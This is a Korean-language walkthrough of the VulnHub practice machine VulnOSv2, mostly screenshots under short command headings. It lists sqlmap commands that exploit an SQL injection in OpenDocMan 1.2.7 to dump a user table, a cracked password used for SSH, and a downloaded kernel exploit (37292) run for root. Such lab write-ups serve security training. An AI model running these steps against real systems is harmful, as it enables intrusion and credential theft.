[VulnOSv2](https://www.vulnhub.com/entry/vulnos-2,147/)

# targetdiscovery
***
### nmap -sn 192.168.25.29-255 --open
![1](https://user-images.githubusercontent.com/69203345/114272250-648dae00-9a50-11eb-89ab-d4e29b2a2e98.PNG)  

# enumerate + exploitation
***
## target: 192.168.25.36
### nmap -O -sV -sS -p- 192.168.25.36
![2](https://user-images.githubusercontent.com/69203345/114272264-75d6ba80-9a50-11eb-9a79-8b4880a09fbf.PNG)      
##### nikto and dirb 192.168.25.36
![3](https://user-images.githubusercontent.com/69203345/114272694-23969900-9a52-11eb-97f6-49bf06ad10b5.PNG)       
192.168.25.36       
![4](https://user-images.githubusercontent.com/69203345/114272800-8ab44d80-9a52-11eb-9b75-86a8bde34b4f.PNG)       
드래그 하면서 다니다가 우연히 발견함 ㅋㅋㅋㅋ      
![5](https://user-images.githubusercontent.com/69203345/114272931-1e861980-9a53-11eb-9f19-3ba0742f6b38.PNG)        
opendocman 1.2.7 이 있으니까 한번 검색 해보기로 함     
![6](https://user-images.githubusercontent.com/69203345/114272995-54c39900-9a53-11eb-8914-cfe1f7f377f0.PNG)       
내용중    
![7](https://user-images.githubusercontent.com/69203345/114273015-6e64e080-9a53-11eb-98ac-28be958b70bb.PNG)      
일단 이거 이용해보자     
![8](https://user-images.githubusercontent.com/69203345/114273050-90f6f980-9a53-11eb-8751-55d21227c489.PNG)
되는거 보아하니 sqlinjection을 이용해서 진행하면 될듯하다       
##### sqlmap -u "://192.168.25.36/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbs      
![9](https://user-images.githubusercontent.com/69203345/114273241-390cc280-9a54-11eb-896f-d9570e0c9feb.PNG)       
##### sqlmap -u "://192.168.25.36/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs --tables     
![10](https://user-images.githubusercontent.com/69203345/114273288-71140580-9a54-11eb-9ad6-47c39e4297c7.PNG)       
##### sqlmap -u "://192.168.25.36/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs -T odm_user --dump      
![11](https://user-images.githubusercontent.com/69203345/114273356-acaecf80-9a54-11eb-8e06-f8b14a671da1.PNG)        
해쉬 해독사이트에 들어가서 해독하자       
![12](https://user-images.githubusercontent.com/69203345/114273445-01524a80-9a55-11eb-8594-b260be31b314.PNG)       
webmin1980 
##### ssh webmin@192.168.25.36 접속
![13](https://user-images.githubusercontent.com/69203345/114273502-3bbbe780-9a55-11eb-96a3-d631c8ab95aa.PNG)
오 접속      
# privilege escalation 
***
lsb_release -a , unmae -a        
![14](https://user-images.githubusercontent.com/69203345/114273561-7cb3fc00-9a55-11eb-942f-0526c24431cd.PNG)        
커널 릴리스 3.13 우분투 버전 14.04.4 구글 검색  ㄱㄱㄱ        
![15](https://user-images.githubusercontent.com/69203345/114273703-26938880-9a56-11eb-8aff-dd6f189486f5.PNG)      
![16](https://user-images.githubusercontent.com/69203345/114273747-4f1b8280-9a56-11eb-8597-72378ead33c6.PNG)      
좋은걸 찾은거같다       
wget 으로 받아주자     
![17](https://user-images.githubusercontent.com/69203345/114273804-85f19880-9a56-11eb-8e8b-ad54691bc51d.PNG)        
37292 -> 37292.c 바꿔준후 실행     
![18](https://user-images.githubusercontent.com/69203345/114273877-e680d580-9a56-11eb-95df-cecffa8b50b6.PNG)      
cat flag.txt       
![19](https://user-images.githubusercontent.com/69203345/114273977-542d0180-9a57-11eb-92e6-727bfde579ac.PNG)

ㄲ-ㅌ       
root획득      
꼭 이방법만 있는것은 아니다.     
으악.     
***
